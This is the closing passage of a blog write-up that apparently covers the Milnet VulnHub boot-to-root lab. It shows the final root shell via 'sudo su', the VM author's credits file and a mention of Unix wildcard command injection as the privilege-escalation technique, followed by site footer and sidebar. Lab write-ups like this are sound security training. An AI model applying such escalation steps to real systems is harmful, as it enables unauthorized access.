<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo su
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'>cat /root/credits.txt
</span><span class='line'>        ,----,                                                               
</span><span class='line'>      ,/   .`|                                                               
</span><span class='line'>    ,`   .'  :  ,---,                          ,---,.                        
</span><span class='line'>  ;    ;     /,--.' |                        ,'  .' |                  ,---, 
</span><span class='line'>.'___,/    ,' |  |  :                      ,---.'   |      ,---,     ,---.'| 
</span><span class='line'>|    :     |  :  :  :                      |   |   .'  ,-+-. /  |    |   | : 
</span><span class='line'>;    |.';  ;  :  |  |,--.   ,---.          :   :  |-, ,--.'|'   |    |   | | 
</span><span class='line'>`----'  |  |  |  :  '   |  /     \         :   |  ;/||   |  ,"' |  ,--.__| | 
</span><span class='line'>    '   :  ;  |  |   /' : /    /  |        |   :   .'|   | /  | | /   ,'   | 
</span><span class='line'>    |   |  '  '  :  | | |.    ' / |        |   |  |-,|   | |  | |.   '  /  | 
</span><span class='line'>    '   :  |  |  |  ' | :'   ;   /|        '   :  ;/||   | |  |/ '   ; |:  | 
</span><span class='line'>    ;   |.'   |  :  :_:,''   |  / |        |   |    \|   | |--'  |   | '/  ' 
</span><span class='line'>    '---'     |  | ,'    |   :    |        |   :   .'|   |/      |   :    :| 
</span><span class='line'>              `--''       \   \  /         |   | ,'  '---'        \   \  /   
</span><span class='line'>                           `----'          `----'                  `----'    
</span><span class='line'>                                                                             
</span><span class='line'>
</span><span class='line'>This was milnet for #vulnhub by @teh_warriar
</span><span class='line'>I hope you enjoyed this vm!
</span><span class='line'>
</span><span class='line'>If you liked it drop me a line on twitter or in #vulnhub.
</span><span class='line'>
</span><span class='line'>I hope you found the clue:
</span><span class='line'>/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
</span><span class='line'>I was sitting on the idea for using this technique for a BOOT2ROOT VM prives for a long time...
</span><span class='line'>
</span><span class='line'>This VM was inspired by The Cuckoo's Egg. 
</span><span class='line'>If you have not read it give it a try:
</span><span class='line'>http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/</span></code></pre></td></tr></table></div></figure>


<p>Great challenge, dropping some old-school knowledge about getting command injection by exploiting Unix wildcards!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Increased knowledge will help you now. \
</span><span class='line'>\ Have mate's phone bugged.              /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>

      








  


<time datetime="2018-05-13T06:55:41-04:00" pubdate data-updated="true">May 13<span>th</span>, 2018</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2018/05/13/hacking-the-milnet/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2018/05/13/hacking-the-milnet/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2018/05/04/dropping-droopy/" title="Previous Post: Dropping Droopy">&laquo; Dropping Droopy</a>
      
      
        <a class="basic-alignment right" href="/blog/2018/05/26/got-a-stapler/" title="Next Post: Got a Stapler?">Got a Stapler? &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>whoami</h1>
  <p>switch (interests){<br>
 case INFORMATION SECURITY:<br>
Mostly offensive security, but trying to be well-rounded in everything;<br>
case PYTHON:<br>
Mainly security and sysadmin related scripting;<br>
case LINUX:<br>
Greetings from /dev/null;<br>
case JAPANESE:<br>
Language, anime, samurai;<br>
case MARTIAL ARTS:<br>
If it's fighting I like it;<br>
case MILITARY SCIENCE:<br>
Ancient, medieval, modern;<br>
default: GAMING;}</p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2018/11/16/hackfest-2016-sedna/">Hackfest 2016: Sedna</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/11/11/social-engineering-expert-course-review/">Social Engineering Expert course review</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/11/10/take-the-spydersec-challenge/">Take the SpyderSec Challenge</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/10/26/all-your-64base-are-belong-to-us/">All your 64Base are belong to us</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can/">SkyDog Con CTF 2016 - Catch Me If You Can</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'chousensha',
            count: 5,
            skip_forks: true,
	    skip_repos: [ "chousensha.github.io" ],
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
  </ul>
  
    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
  
</section>

<section>
  <h1>Blogroll</h1>
  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2018 - chousensha -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'coredumpoverflow';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://chousensha.github.io/blog/2018/05/13/hacking-the-milnet/';
        var disqus_url = 'http://chousensha.github.io/blog/2018/05/13/hacking-the-milnet/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
